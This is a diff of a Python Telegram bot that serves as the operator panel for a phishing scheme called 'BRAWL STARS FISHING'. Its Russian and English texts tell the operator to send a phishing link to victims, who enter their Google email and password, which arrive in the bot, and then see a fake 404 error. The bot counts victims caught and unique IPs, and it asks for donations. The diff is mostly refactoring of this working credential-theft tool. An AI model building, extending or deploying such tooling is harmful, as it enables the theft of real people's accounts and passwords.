@@ -13,53 +13,47 @@ last_update_id = 0
 victims = []
 user_language = {}
 
-# ========== ТЕКСТЫ НА РАЗНЫХ ЯЗЫКАХ ==========
+# ========== ТЕКСТЫ ==========
 TEXTS = {
     'ru': {
         'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.",
-        'instruction': "📖 **ИНСТРУКЦИЯ** 📖\n\n1️⃣ Отправь ссылку жертве\n2️⃣ Жертва вводит почту и пароль Google\n3️⃣ Данные приходят сюда\n4️⃣ Жертва видит ошибку 404\n\n⚠️ Ссылка всегда одна: {url}\n\n⭐ Чем больше жертв — тем больше данных!",
-        'data_empty': "📭 **Нет данных**\n\nПока нет ни одной жертвы.",
+        'instruction': "📖 **ИНСТРУКЦИЯ**\n\n1️⃣ Отправь ссылку\n2️⃣ Жертва вводит почту и пароль\n3️⃣ Данные приходят сюда\n4️⃣ Жертва видит 404\n\n⚠️ Ссылка: {url}",
+        'data_empty': "📭 **Нет данных**",
         'data_title': "👥 **Пойманные жертвы:**\n\n",
-        'stats': "📊 **СТАТИСТИКА** 📊\n\n👨‍💼 Всего жертв: {total}\n🌐 Уникальных IP: {unique}",
-        'donate': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nВыбери сумму доната:\n\n⭐ Telegram Stars — официальная поддержка.\n💰 Цены: 25⭐ ≈ 50₽ | 50⭐ ≈ 100₽ | 100⭐ ≈ 200₽\n\nСпасибо за поддержку! 💙",
-        'donate_25': "✨ Поддержка на 25 звёзд ✨\n\nСпасибо за поддержку! 💙",
-        'donate_50': "✨ Поддержка на 50 звёзд ✨\n\nСпасибо за поддержку! 💙",
-        'donate_100': "✨ Поддержка на 100 звёзд ✨\n\nСпасибо за поддержку! 💙",
-        'settings': "⚙️ **НАСТРОЙКИ** ⚙️\n\nВыбери язык / Choose language:",
-        'lang_changed': "✅ Язык изменён на русский!",
-        'lang_changed_en': "✅ Language changed to English!",
+        'stats': "📊 **СТАТИСТИКА**\n\n👨‍💼 Всего жертв: {total}\n🌐 Уникальных IP: {unique}",
+        'donate': "✨ **ПОДДЕРЖАТЬ**\n\n⭐ 25⭐ ≈ 50₽\n⭐ 50⭐ ≈ 100₽\n⭐ 100⭐ ≈ 200₽",
+        'settings': "⚙️ **НАСТРОЙКИ**\n\nВыбери язык:",
+        'lang_changed': "✅ Язык: Русский",
+        'lang_changed_en': "✅ Language: English",
         'back': "🔙 Назад",
-        'data_btn': "📋 Данные жертв",
+        'data_btn': "📋 Данные",
         'stats_btn': "📊 Статистика",
-        'donate_btn': "⭐ Поддержать автора",
+        'donate_btn': "⭐ Поддержать",
         'instruction_btn': "📖 Инструкция",
         'settings_btn': "⚙️ Настройки",
-        'donate_25_btn': "⭐ 25 звёзд",
-        'donate_50_btn': "⭐ 50 звёзд",
-        'donate_100_btn': "⭐ 100 звёзд"
+        'donate_25_btn': "⭐ 25⭐",
+        'donate_50_btn': "⭐ 50⭐",
+        'donate_100_btn': "⭐ 100⭐"
     },
     'en': {
-        'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims caught:** {count}\n\n📌 Send the link to the victim — data will come here.",
-        'instruction': "📖 **INSTRUCTION** 📖\n\n1️⃣ Send the link to the victim\n2️⃣ Victim enters Google email and password\n3️⃣ Data comes here\n4️⃣ Victim sees 404 error\n\n⚠️ Link is always the same: {url}\n\n⭐ More victims = more data!",
-        'data_empty': "📭 **No data**\n\nNo victims yet.",
-        'data_title': "👥 **Victims caught:**\n\n",
-        'stats': "📊 **STATISTICS** 📊\n\n👨‍💼 Total victims: {total}\n🌐 Unique IPs: {unique}",
-        'donate': "✨ **SUPPORT THE AUTHOR** ✨\n\nChoose donation amount:\n\n⭐ Telegram Stars is official support.\n💰 Prices: 25⭐ ≈ €0.5 | 50⭐ ≈ €1 | 100⭐ ≈ €2\n\nThank you for your support! 💙",
-        'donate_25': "✨ Support with 25 stars ✨\n\nThank you for your support! 💙",
-        'donate_50': "✨ Support with 50 stars ✨\n\nThank you for your support! 💙",
-        'donate_100': "✨ Support with 100 stars ✨\n\nThank you for your support! 💙",
-        'settings': "⚙️ **SETTINGS** ⚙️\n\nChoose language / Выбери язык:",
-        'lang_changed': "✅ Language changed to English!",
-        'lang_changed_ru': "✅ Язык изменён на русский!",
+        'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims:** {count}\n\n📌 Send link to victim.",
+        'instruction': "📖 **INSTRUCTION**\n\n1️⃣ Send link\n2️⃣ Victim enters email/password\n3️⃣ Data comes here\n4️⃣ Victim sees 404\n\n⚠️ Link: {url}",
+        'data_empty': "📭 **No data**",
+        'data_title': "👥 **Victims:**\n\n",
+        'stats': "📊 **STATISTICS**\n\n👨‍💼 Total: {total}\n🌐 Unique IPs: {unique}",
+        'donate': "✨ **SUPPORT**\n\n⭐ 25⭐ ≈ €0.5\n⭐ 50⭐ ≈ €1\n⭐ 100⭐ ≈ €2",
+        'settings': "⚙️ **SETTINGS**\n\nChoose language:",
+        'lang_changed': "✅ Language: English",
+        'lang_changed_ru': "✅ Язык: Русский",
         'back': "🔙 Back",
-        'data_btn': "📋 Victims data",
-        'stats_btn': "📊 Statistics",
-        'donate_btn': "⭐ Support author",
-        'instruction_btn': "📖 Instruction",
+        'data_btn': "📋 Data",
+        'stats_btn': "📊 Stats",
+        'donate_btn': "⭐ Support",
+        'instruction_btn': "📖 Guide",
         'settings_btn': "⚙️ Settings",
-        'donate_25_btn': "⭐ 25 stars",
-        'donate_50_btn': "⭐ 50 stars",
-        'donate_100_btn': "⭐ 100 stars"
+        'donate_25_btn': "⭐ 25⭐",
+        'donate_50_btn': "⭐ 50⭐",
+        'donate_100_btn': "⭐ 100⭐"
     }
 }
 
@@ -93,31 +87,16 @@ def answer_callback(callback_id, text="", show_alert=False):
 
 def get_main_keyboard(chat_id):
     return [
-        [
-            {"text": get_button_text(chat_id, 'data_btn'), "callback_data": "data"},
-            {"text": get_button_text(chat_id, 'stats_btn'), "callback_data": "stats"}
-        ],
-        [
-            {"text": get_button_text(chat_id, 'donate_btn'), "callback_data": "donate_menu"}
-        ],
-        [
-            {"text": get_button_text(chat_id, 'instruction_btn'), "callback_data": "instruction"},
-            {"text": get_button_text(chat_id, 'settings_btn'), "callback_data": "settings"}
-        ]
+        [{"text": get_button_text(chat_id, 'data_btn'), "callback_data": "data"}, {"text": get_button_text(chat_id, 'stats_btn'), "callback_data": "stats"}],
+        [{"text": get_button_text(chat_id, 'donate_btn'), "callback_data": "donate_menu"}],
+        [{"text": get_button_text(chat_id, 'instruction_btn'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'settings_btn'), "callback_data": "settings"}]
     ]
 
 def get_donate_keyboard(chat_id):
     return [
-        [
-            {"text": get_button_text(chat_id, 'donate_25_btn'), "url": "https://t.me/telegram?start=star25"},
-            {"text": get_button_text(chat_id, 'donate_50_btn'), "url": "https://t.me/telegram?start=star50"}
-        ],
-        [
-            {"text": get_button_text(chat_id, 'donate_100_btn'), "url": "https://t.me/telegram?start=star100"}
-        ],
-        [
-            {"text": get_button_text(chat_id, 'back'), "callback_data": "back"}
-        ]
+        [{"text": get_button_text(chat_id, 'donate_25_btn'), "url": "https://t.me/telegram?start=star25"}, {"text": get_button_text(chat_id, 'donate_50_btn'), "url": "https://t.me/telegram?start=star50"}],
+        [{"text": get_button_text(chat_id, 'donate_100_btn'), "url": "https://t.me/telegram?start=star100"}],
+        [{"text": get_button_text(chat_id, 'back'), "callback_data": "back"}]
     ]
 
 def get_back_keyboard(chat_id):
@@ -130,7 +109,7 @@ def get_language_keyboard():
         [{"text": "⬅️ Назад", "callback_data": "back"}]
     ]
 
-# Минимальный веб-сервер для Render
+# === ВЕБ-СЕРВЕР ДЛЯ RENDER (чтобы порт был открыт) ===
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -147,6 +126,7 @@ threading.Thread(target=run_health_server, daemon=True).start()
 print("✅ Бот запущен на Render.com!")
 print(f"🔗 Ссылка: {PHISHING_URL}")
 
+# === ОСНОВНОЙ ЦИКЛ БОТА ===
 while True:
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=10"
@@ -160,63 +140,47 @@ while True:
             if message:
                 chat_id = message.get("chat", {}).get("id")
                 text = message.get("text", "")
-                
                 if chat_id != ADMIN_ID:
                     send_message(chat_id, "❌ Доступ запрещён")
                     continue
-
                 if text == "/start":
                     user_language[chat_id] = 'ru'
-                    send_message(chat_id, 
-                        get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)),
-                        get_main_keyboard(chat_id))
+                    send_message(chat_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
 
             if callback:
                 chat_id = callback.get("from", {}).get("id")
                 data = callback.get("data")
                 callback_id = callback.get("id")
                 message_id = callback.get("message", {}).get("message_id")
-                
+
                 if chat_id != ADMIN_ID:
                     answer_callback(callback_id, "❌ Доступ запрещён", True)
                     continue
 
                 if data == "back":
-                    edit_message(chat_id, message_id,
-                        get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)),
-                        get_main_keyboard(chat_id))
+                    edit_message(chat_id, message_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
                     answer_callback(callback_id)
 
                 elif data == "donate_menu":
-                    edit_message(chat_id, message_id,
-                        get_text(chat_id, 'donate'),
-                        get_donate_keyboard(chat_id))
+                    edit_message(chat_id, message_id, get_text(chat_id, 'donate'), get_donate_keyboard(chat_id))
                     answer_callback(callback_id)
 
                 elif data == "instruction":
-                    edit_message(chat_id, message_id,
-                        get_text(chat_id, 'instruction', url=PHISHING_URL),
-                        get_back_keyboard(chat_id))
+                    edit_message(chat_id, message_id, get_text(chat_id, 'instruction', url=PHISHING_URL), get_back_keyboard(chat_id))
                     answer_callback(callback_id)
 
                 elif data == "settings":
-                    edit_message(chat_id, message_id,
-                        get_text(chat_id, 'settings'),
-                        get_language_keyboard())
+                    edit_message(chat_id, message_id, get_text(chat_id, 'settings'), get_language_keyboard())
                     answer_callback(callback_id)
 
                 elif data == "lang_ru":
                     user_language[chat_id] = 'ru'
-                    edit_message(chat_id, message_id,
-                        get_text(chat_id, 'lang_changed'),
-                        get_back_keyboard(chat_id))
+                    edit_message(chat_id, message_id, get_text(chat_id, 'lang_changed'), get_back_keyboard(chat_id))
                     answer_callback(callback_id)
 
                 elif data == "lang_en":
                     user_language[chat_id] = 'en'
-                    edit_message(chat_id, message_id,
-                        get_text(chat_id, 'lang_changed_en'),
-                        get_back_keyboard(chat_id))
+                    edit_message(chat_id, message_id, get_text(chat_id, 'lang_changed_en'), get_back_keyboard(chat_id))
                     answer_callback(callback_id)
 
                 elif data == "data":
@@ -234,9 +198,7 @@ while True:
 
                 elif data == "stats":
                     unique_ips = len(set(v.get('ip') for v in victims if v.get('ip')))
-                    edit_message(chat_id, message_id,
-                        get_text(chat_id, 'stats', total=len(victims), unique=unique_ips),
-                        get_back_keyboard(chat_id))
+                    edit_message(chat_id, message_id, get_text(chat_id, 'stats', total=len(victims), unique=unique_ips), get_back_keyboard(chat_id))
                     answer_callback(callback_id)
 
         time.sleep(1)
